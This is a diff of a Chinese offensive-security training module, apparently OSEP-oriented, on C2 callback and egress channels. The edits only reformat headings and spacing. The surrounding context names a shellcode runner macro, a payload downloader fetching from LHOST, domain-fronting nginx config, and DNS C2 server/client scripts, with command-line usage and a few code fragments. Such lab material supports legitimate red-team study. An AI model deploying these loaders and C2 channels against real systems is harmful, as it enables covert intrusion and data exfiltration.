@@ -4,9 +4,9 @@
 
 # 09 · C2 回连与出网通道（分阶段 / 代理 / DNS / 域前置）
 
-> **覆盖场景：**17、28、29、30、31、32、33
+> **覆盖场景：** 17、28、29、30、31、32、33
 >
-> **前置依赖：**攻击机（Kali）+ 一个入口会话；HTTPS 需自签证书（生成见 [00-environment-and-infra](/zh/modules/00-environment-and-infra) §3）；DNS 通道需一个可把 NS 指向你的域或实验网允许的直连 UDP 53；域前置需可自定义 Host 转发的 CDN/自建 nginx 前端。
+> **前置依赖：** 攻击机（Kali）+ 一个入口会话；HTTPS 需自签证书（生成见 [00-environment-and-infra](/zh/modules/00-environment-and-infra) §3）；DNS 通道需一个可把 NS 指向你的域或实验网允许的直连 UDP 53；域前置需可自定义 Host 转发的 CDN/自建 nginx 前端。
 
 **核心思想**：本模块解决"代码能跑但会话/第二阶段回不来"的问题。所有方案都围绕一条**已验证可达的通信路径**展开——先验证路径（投递、代理、DNS 解析、TLS 握手），再让每个阶段走同一条路径。任何阶段换了地址/端口/协议/代理上下文，都是场景 30 的翻版。
 
@@ -44,7 +44,7 @@ python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads   # 请求日志�
 | `m03-dotnettojscript-loader.js` | 内嵌第二阶段的桥接参考 | 粘 C# payload |
 | `m09-proxy-aware-downloader.ps1` | 下载走系统代理时的下载器 | 见场景 28 |
 
-#### `m00-delivery-server.py` {#m00-delivery-server-py}
+#### `m00-delivery-server.py`
 
 ````python
 #!/usr/bin/env python3
@@ -199,7 +199,7 @@ if __name__ == "__main__":
     sys.exit(main())
 ````
 
-#### `m01-shellcode-runner-vba-archbranch.vba` {#m01-shellcode-runner-vba-archbranch-vba}
+#### `m01-shellcode-runner-vba-archbranch.vba`
 
 ````vb
 ' 用途：用 VBA 编译期常量自动匹配 Office 位数，避免投递位数不匹配的 Runner 导致宿主崩溃
@@ -285,7 +285,7 @@ Sub Document_Open()
 End Sub
 ````
 
-#### `m03-dotnettojscript-loader.js` {#m03-dotnettojscript-loader-js}
+#### `m03-dotnettojscript-loader.js`
 
 ````javascript
 /*
@@ -343,7 +343,7 @@ WScript.Echo("[*] 上方宿主信息用于确认产物平台(--ver/编译平台)
 WScript.Quit(0);
 ````
 
-#### `m09-proxy-aware-downloader.ps1` {#m09-proxy-aware-downloader-ps1}
+#### `m09-proxy-aware-downloader.ps1`
 
 ````powershell
 <#
@@ -598,7 +598,7 @@ netsh winhttp show proxy
 | `m00-delivery-server.py` | 第二阶段投递 + 请求日志 | `--port 80 --dir ~/osep/payloads` |
 | `m09-proxy-aware-downloader.ps1` | 第二阶段下载若需走代理 | `-Url http://LHOST/PAYLOAD -Command` |
 
-#### `m09-https-listener.sh` {#m09-https-listener-sh}
+#### `m09-https-listener.sh`
 
 ````bash
 #!/usr/bin/env bash
@@ -954,7 +954,7 @@ exit 0
 | `m09-domain-fronting-nginx.conf` | 需要按域名转发/SNI 处理时的前端模板 | 见场景 33 |
 | `m09-proxy-aware-downloader.ps1` | HTTPS 下载 + 证书校验开关 | `-Url https://LHOST/PAYLOAD -SkipCertCheck` |
 
-#### `m09-domain-fronting-nginx.conf` {#m09-domain-fronting-nginx-conf}
+#### `m09-domain-fronting-nginx.conf`
 
 ````nginx
 # 用途：域前置（Domain Fronting）前端配置——TLS 层用目标放行的前端域名 DOMAIN（SNI + 证书），
@@ -1142,7 +1142,7 @@ python3 m09-dns-c2-client.py --server LHOST --port 53 --domain c2.example \
 | `m09-dns-c2-server.py` | DNS C2 服务端（UDP 53，A 记录应答） | `--listen 0.0.0.0 --port 53 --domain c2.example` |
 | `m09-dns-c2-client.py` | DNS C2 客户端（心跳/收命令/回传输出） | `--server LHOST --session a1b2c3d4 --interval 2` |
 
-#### `m09-dns-c2-server.py` {#m09-dns-c2-server-py}
+#### `m09-dns-c2-server.py`
 
 ````python
 #!/usr/bin/env python3
@@ -1334,7 +1334,7 @@ if __name__ == "__main__":
     main()
 ````
 
-#### `m09-dns-c2-client.py` {#m09-dns-c2-client-py}
+#### `m09-dns-c2-client.py`
 
 ````python
 #!/usr/bin/env python3
